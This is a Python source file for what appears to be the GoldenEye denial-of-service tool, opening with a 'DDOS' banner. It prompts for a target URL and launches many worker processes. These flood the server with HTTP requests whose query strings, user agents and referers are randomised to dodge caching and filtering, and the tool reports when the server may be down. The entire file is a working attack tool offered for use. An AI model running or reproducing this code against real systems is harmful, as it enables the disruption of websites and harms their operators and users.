from multiprocessing import Process, Manager
import ssl, sys, random, time
from urllib.parse import urlparse

# Python version-specific
if sys.version_info < (3, 0):
    import httplib
    HTTPCLIENT = httplib
else:
    import http.client
    HTTPCLIENT = http.client

from termcolor import colored

####
# Config
####
DEBUG = False

####
# Constants
####
METHOD_GET = 'get'
METHOD_POST = 'post'
METHOD_RAND = 'random'

JOIN_TIMEOUT = 1.0

DEFAULT_WORKERS = 50
DEFAULT_SOCKETS = 30

####
# GoldenEye Class
####

class GoldenEye(object):

    # Counters
    counter = [0, 0]
    last_counter = [0, 0]

    # Containers
    workersQueue = []
    manager = None

    # Properties
    url = None

    # Options
    nr_workers = DEFAULT_WORKERS
    nr_sockets = DEFAULT_SOCKETS
    method = METHOD_GET

    def __init__(self, url):
        self.url = url
        self.manager = Manager()
        self.counter = self.manager.list((0, 0))

    def exit(self):
        self.stats()
        print("Shutting down GoldenEye")

    def __del__(self):
        self.exit()

    def printHeader(self):
        print("GoldenEye firing!")

    def fire(self):
        self.printHeader()
        print(f"Hitting webserver in mode {self.method} with {self.nr_workers} workers running {self.nr_sockets} connections each")
        if DEBUG:
            print(f"Starting {self.nr_workers} concurrent Laser workers")

        for i in range(int(self.nr_workers)):
            try:
                worker = Laser(self.url, self.nr_sockets, self.counter)
                worker.method = self.method
                self.workersQueue.append(worker)
                worker.start()
            except Exception:
                error(f"Failed to start worker {i}")
                pass

        print("Initiating monitor")
        self.monitor()

    def stats(self):
        try:
            if self.counter[0] > 0 or self.counter[1] > 0:
                print(f"{self.counter[0]} GoldenEye punches deferred. ({self.counter[1]} Failed)")
                if self.counter[0] > 0 and self.counter[1] > 0 and self.last_counter[0] == self.counter[0] and self.counter[1] > self.last_counter[1]:
                    print("\tServer may be DOWN!")
                self.last_counter[0] = self.counter[0]
                self.last_counter[1] = self.counter[1]
        except Exception:
            pass

    def monitor(self):
        while len(self.workersQueue) > 0:
            try:
                for worker in self.workersQueue:
                    if worker is not None and worker.is_alive():
                        worker.join(JOIN_TIMEOUT)
                    else:
                        self.workersQueue.remove(worker)
                self.stats()
            except (KeyboardInterrupt, SystemExit):
                print("CTRL+C received. Killing all workers")
                for worker in self.workersQueue:
                    try:
                        if DEBUG:
                            print(f"Killing worker {worker.name}")
                        worker.stop()
                    except Exception:
                        pass
                if DEBUG:
                    raise
                else:
                    pass

####
# Laser Class
####

class Laser(Process):

    # Counters
    request_count = 0
    failed_count = 0

    # Containers
    url = None
    host = None
    port = 80
    ssl = False
    referers = []
    useragents = []
    socks = []
    counter = None
    nr_socks = DEFAULT_SOCKETS

    # Flags
    runnable = True

    # Options
    method = METHOD_GET

    def __init__(self, url, nr_sockets, counter):
        super(Laser, self).__init__()
        self.counter = counter
        self.nr_socks = nr_sockets

        parsedUrl = urlparse(url)
        if parsedUrl.scheme == 'https':
            self.ssl = True

        self.host = parsedUrl.netloc.split(':')[0]
        self.url = parsedUrl.path
        self.port = parsedUrl.port if parsedUrl.port else (443 if self.ssl else 80)

        self.referers = [
            'http://www.google.com/?q=',
            'http://www.usatoday.com/search/results?q=',
            'http://engadget.search.aol.com/search?q=',
            'http://' + self.host + '/'
        ]

        self.useragents = [
            'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
            'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
            'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
            'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
            'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
            'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
        ]

    def __del__(self):
        self.stop()

    def buildblock(self, size):
        out_str = ''
        _LOWERCASE = range(97, 122)
        _UPPERCASE = range(65, 90)
        _NUMERIC = range(48, 57)
        validChars = list(_LOWERCASE) + list(_UPPERCASE) + list(_NUMERIC)

        for i in range(0, size):
            a = random.choice(validChars)
            out_str += chr(a)

        return out_str

    def run(self):
        if DEBUG:
            print(f"Starting worker {self.name}")

        while self.runnable:
            try:
                for i in range(self.nr_socks):
                    if self.ssl:
                        c = HTTPCLIENT.HTTPSConnection(self.host, self.port)
                    else:
                        c = HTTPCLIENT.HTTPConnection(self.host, self.port)
                    self.socks.append(c)

                for conn_req in self.socks:
                    url, headers = self.createPayload()
                    method = random.choice([METHOD_GET, METHOD_POST]) if self.method == METHOD_RAND else self.method
                    conn_req.request(method.upper(), url, None, headers)

                for conn_resp in self.socks:
                    resp = conn_resp.getresponse()
                    self.incCounter()

                self.closeConnections()
            except Exception:
                self.incFailed()
                if DEBUG:
                    raise
                else:
                    pass

        if DEBUG:
            print(f"Worker {self.name} completed run. Sleeping...")

    def closeConnections(self):
        for conn in self.socks:
            try:
                conn.close()
            except:
                pass

    def createPayload(self):
        req_url, headers = self.generateData()
        random_keys = list(headers.keys())
        random.shuffle(random_keys)
        random_headers = {header_name: headers[header_name] for header_name in random_keys}
        return req_url, random_headers

    def generateQueryString(self, amount=1):
        queryString = []
        for i in range(amount):
            key = self.buildblock(random.randint(3, 10))
            value = self.buildblock(random.randint(3, 20))
            element = key + '=' + value
            queryString.append(element)
        return '&'.join(queryString)

    def generateData(self):
        param_joiner = '&' if '?' in self.url else '?'
        url = f"{self.url}{param_joiner}{self.generateQueryString(random.randint(1, 5))}"
        headers = {
            'User-Agent': random.choice(self.useragents),
            'Cache-Control': 'no-cache',
            'Accept-Encoding': 'gzip,deflate',
            'Connection': 'keep-alive',
            'Keep-Alive': '300',
            'Host': self.host,
            'Referer': random.choice(self.referers) + self.buildblock(random.randint(5, 10))
        }
        return url, headers

    def stop(self):
        self.runnable = False
        self.closeConnections()

    def incCounter(self):
        try:
            self.counter[0] += 1
        except Exception:
            pass

    def incFailed(self):
        try:
            self.counter[1] += 1
        except Exception:
            pass

####
# Main
####

def get_parameters():
    print(colored("""
▓█████▄ ▓█████▄  ▒█████    ██████ 
▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   
░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒
 ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
 ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
 ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
   ░       ░        ░ ░        ░  
 ░       ░                                
    """, "red"))

    url = input("Enter target URL: ")
    workers = input("Enter number of workers: ")
    sockets = input("Enter number of sockets: ")
    method = input("Enter HTTP method (get, post, random): ")

    workers = int(workers) if workers.isdigit() else DEFAULT_WORKERS
    sockets = int(sockets) if sockets.isdigit() else DEFAULT_SOCKETS
    method = method.lower() if method.lower() in [METHOD_GET, METHOD_POST, METHOD_RAND] else METHOD_GET

    return url, workers, sockets, method

def main():
    url, workers, sockets, method = get_parameters()

    goldeneye = GoldenEye(url)
    goldeneye.nr_workers = workers
    goldeneye.nr_sockets = sockets
    goldeneye.method = method
    goldeneye.fire()

if __name__ == "__main__":
    main()
